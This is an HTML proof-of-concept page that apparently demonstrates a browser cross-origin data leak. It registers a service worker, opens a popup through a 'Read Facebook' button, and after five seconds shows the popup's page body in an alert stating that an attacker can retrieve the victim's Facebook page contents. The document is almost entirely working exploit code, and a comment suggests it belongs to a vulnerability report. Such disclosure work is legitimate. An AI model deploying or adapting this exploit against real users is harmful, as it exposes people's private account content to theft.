<!doctype html>
<html>

<head>
    <meta charset="utf-8">
    <link rel="manifest" href="manifest.json">
</head>

<body>

    <div id="status"></div>
    <button id="exploit">Read Facebook</button>

    <script>
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('./sw.js', { scope: './' }).then(function () {
                if (navigator.serviceWorker.controller) {
                    document.getElementById('status').textContent = 'The service worker is successfully set.';
                } else {
                    document.getElementById('status').textContent =
                        'Please reload this page to allow the service worker to handle network operations.';
                }
            }).catch(function (error) {
                document.getElementById('status').textContent = error;
            });
        } else {
            document.getElementById('status').textContent = "The current browser doesn't support service workers";
        }
    </script>

    <script>
        var newwin;
        document.getElementById('exploit').onclick = function () {
            // not sure check the report again
            newwin = window.open('./meta', '', 'width=401,height=101,top=300,left=300');

            document.getElementById('status').textContent = "Wait for 5 seconds...";

            setTimeout(function () {
                alert("Attacker can retrieve victim's Facebook page contents: " + newwin.document.body.innerHTML);
            }, 5000);
        }
    </script>